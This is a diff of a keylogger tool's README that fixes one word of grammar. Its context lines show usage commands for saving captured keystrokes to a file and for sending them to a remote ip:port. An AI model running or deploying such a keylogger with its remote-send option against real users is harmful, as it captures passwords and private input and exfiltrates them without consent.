@@ -10,7 +10,7 @@ You can save the output with ```-f filename``` option. For example:
 # keylogger -f keys.txt
 ```
 
-You can redirect sniffed keys in a remote server, using ```-s ip:port``` option. For example:
+You can redirect sniffed keys to a remote server, using ```-s ip:port``` option. For example:
 ```
 # keylogger -s 127.0.0.1:12345
 ```
